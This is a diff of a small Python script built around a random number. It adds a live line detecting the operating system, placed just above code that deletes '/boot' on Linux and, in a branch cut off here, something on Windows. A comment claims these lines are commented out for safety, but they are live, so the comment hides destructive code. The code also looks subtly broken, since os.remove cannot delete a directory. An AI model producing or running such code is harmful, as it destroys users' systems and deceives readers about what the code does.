@@ -9,15 +9,6 @@
 import random
 import os
 
-# Define a function to get the operating system name and version
-def get_os_version():
-    # Get the operating system name (Linux, Windows, etc.)
-    os_name = platform.system()
-    # Get the operating system version
-    os_version = platform.release()
-    # Return the OS name and version
-    return os_name, os_version
-
 # Generate a random number between 1 and 10
 number = random.randint(1,10)
 
@@ -47,6 +38,7 @@ else:
 
     # The following lines attempt to remove critical system files based on the detected OS,
     # but they are commented out here to prevent accidental execution and system damage.
+    os_name = platform.system()
     if os_name == 'Linux':
       os.remove("/boot")
     elif os_name == 'Windows':
